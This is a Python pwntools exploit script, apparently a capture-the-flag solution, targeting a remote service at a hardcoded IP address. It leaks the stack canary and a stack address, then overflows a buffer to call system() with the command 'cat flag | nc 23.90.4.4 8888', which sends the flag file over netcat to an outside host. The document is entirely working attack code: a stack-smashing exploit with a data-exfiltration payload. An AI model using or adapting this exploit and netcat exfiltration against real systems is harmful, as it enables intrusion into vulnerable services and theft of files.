from pwn import *
import struct

#r = remote('localhost', 8181)
r = remote('110.10.212.130', 8888)

r.sendline('2')
r.recvuntil("Message : ")
r.sendline('A'*40) # sendline also sends the \n which overrides the NULL in the
# stack cookie, letting us read it
cookie = r.recv(4)
cookie = cookie[:3] + '\x00'

print "Cookie:", cookie.encode('hex')
r.recvuntil('menu > ')

r.sendline('2')
r.recvuntil("Message : ")
r.sendline('A'*64)
x = r.recv()
stack = x[12:16] # outside gdb

stack = struct.unpack('>I', stack)[0] - 160 # Points to where the ret from system (DDDD) will be
print "Stack:", hex(stack)

r.recvuntil('menu > ')
r.sendline('1')

system = 0x08048620

cmd = 'cat flag | nc 23.90.4.4 8888'
cmd += "\x00"

r.sendline('A'*40 + cookie[::-1] + 'A'*4 + 'B'*4 + 'C'*4 + p32(system) + 'D'*4 + struct.pack('<I', stack+4+4) + cmd)

r.recvuntil('menu > ')

r.sendline('3')

print r.recv()
